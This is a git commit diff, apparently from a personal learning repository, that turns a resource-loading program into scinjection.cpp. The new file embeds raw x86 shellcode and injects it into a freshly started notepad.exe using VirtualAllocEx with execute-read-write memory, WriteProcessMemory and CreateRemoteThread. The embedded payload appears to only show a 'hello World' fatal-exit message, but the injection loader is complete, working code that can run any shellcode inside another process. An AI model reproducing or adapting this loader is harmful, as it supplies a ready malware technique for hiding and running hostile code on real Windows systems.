68014ff37922a52b894d6b2dddc1e70faef1d7f3
rnranalysis <43582849+rnranalysis@users.noreply.github.com>
2019-01-28 12:20:02 -0500

    Update and rename injection.cpp to scinjection.cpp

--- scinjection.cpp
+++ scinjection.cpp
@@ -1,6 +1,7 @@
 #include "pch.h"
 #include <iostream>
 #include <windows.h>
+#include <Processthreadsapi.h>
 
 int main()
 {
@@ -10,7 +11,18 @@ int main()
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(103), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
+	char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
+		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
+		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
+		"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
+		"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
+		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x72\x6c"
+		"\x64\x01\x68\x6c\x6f\x57\x6f\x68\x20\x68\x65\x6c\x89\xe1\xfe"
+		"\x49\x0b\x31\xc0\x51\x50\xff\xd7";
+	int sclen = sizeof(shellcode);
+
+	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
+
 	if (hRsc == 0)
 	{
 		int err = GetLastError();
@@ -18,7 +30,6 @@ int main()
 	}
 	else
 	{
-		printf("FindResource suceeded. \nHandle: %s", hRsc);
 		HGLOBAL hData = LoadResource(NULL, hRsc);
 		if (hData == 0)
 		{
@@ -28,8 +39,8 @@ int main()
 		else
 		{
 			DWORD sizeRsc = SizeofResource(NULL, hRsc);
-			printf("\nSize: %d", sizeRsc);
-			printf("\nPTR to Data: %d", hData);
+			printf("\nSize of resource: %d", sizeRsc);
+			printf("Size of shellcode: %d", sclen);
 			BOOL bProc = CreateProcessA((LPCSTR)"C:\\Windows\\System32\\notepad.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_NEW_CONSOLE, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi);
 			if (bProc == 0)
 			{
@@ -44,23 +55,19 @@ int main()
 				}
 				else
 				{
-					LPVOID newMem = (LPVOID)VirtualAllocEx(hProc, NULL, sizeRsc, MEM_RESERVE | MEM_COMMIT, 0x40);
-					if (!WriteProcessMemory(hProc, (LPVOID)newMem, hData, sizeRsc, NULL))
+					LPVOID newMem = VirtualAllocEx(hProc, NULL, sclen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+					if (!WriteProcessMemory(hProc, (LPVOID)newMem, &shellcode, sclen, NULL))
 					{
 						int err = GetLastError();
 						printf("WriteProcessMemory Error: %d", err);
 					}
 					else
 					{
-						CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)newMem, NULL, 0, NULL);
+						CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) newMem, NULL, 0, NULL);
 					}
 				}
+			}
 		}
 	}
-
-	
-		
-	}
-	
 }
 
